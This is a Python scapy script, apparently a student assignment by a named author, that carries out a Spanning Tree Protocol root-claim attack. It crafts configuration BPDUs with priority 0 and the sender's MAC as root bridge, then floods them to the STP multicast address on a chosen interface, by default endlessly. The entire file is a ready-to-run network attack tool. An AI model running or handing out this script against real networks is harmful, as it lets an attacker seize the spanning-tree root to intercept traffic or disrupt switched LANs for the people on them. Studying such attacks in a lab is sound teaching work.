#!/usr/bin/env python3
"""
==============================================================
  STP Root Claim Attack Script
  Autor   : Ashley Fabian
  Matrícula: 2025-0773
  Script  : AshleyFabian_2025-0773_STP_RootClaim_P1.py
==============================================================
"""

import argparse
import time
import os
import sys
from scapy.all import Ether, LLC, STP, sendp, get_if_hwaddr, conf

STP_MULTICAST = "01:80:c2:00:00:00"

def build_bpdu(iface_mac, priority):
    return (
        Ether(src=iface_mac, dst=STP_MULTICAST) /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(
            proto=0, version=0, bpdutype=0x00, bpduflags=0x01,
            rootid=priority, rootmac=iface_mac, pathcost=0,
            bridgeid=priority, bridgemac=iface_mac,
            portid=0x8001, age=0, maxage=20, hellotime=2, fwddelay=15
        )
    )

def attack(iface, count, delay, priority):
    print("\n[*] STP Root Claim Attack — Ashley Fabian (2025-0773)")
    conf.verb = 0
    mac = get_if_hwaddr(iface)
    print(f"[*] Interfaz: {iface} | MAC: {mac} | Prioridad: {priority}\n")
    sent = 0
    try:
        while count == 0 or sent < count:
            sendp(build_bpdu(mac, priority), iface=iface, verbose=False)
            sent += 1
            print(f"[+] BPDUs enviados: {sent}", end="\r")
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[!] Detenido. Total: {sent}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface",    required=True)
    parser.add_argument("-c", "--count",    type=int,   default=0)
    parser.add_argument("-d", "--delay",    type=float, default=1)
    parser.add_argument("-p", "--priority", type=int,   default=0)
    args = parser.parse_args()
    attack(args.iface, args.count, args.delay, args.priority)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Ejecutar como root.")
        sys.exit(1)
    main()
